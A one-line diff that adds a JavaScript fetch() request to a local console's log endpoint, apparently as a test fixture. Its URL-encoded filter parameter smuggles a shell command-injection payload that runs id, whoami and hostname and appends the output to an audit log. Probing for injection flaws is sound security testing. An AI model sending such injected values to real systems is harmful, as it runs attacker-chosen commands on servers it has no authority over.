@@ -1,0 +1,1 @@
+fetch('https://127.0.0.1:8443/console/logs?filter=%27%3Becho%20PROBE%20%24%28id%29%20%24%28whoami%29%20%24%28hostname%29%20%3E%3E%20/srv/application/logs/audit.log%3B%27', {headers: {Cookie: "session=fixture"}});
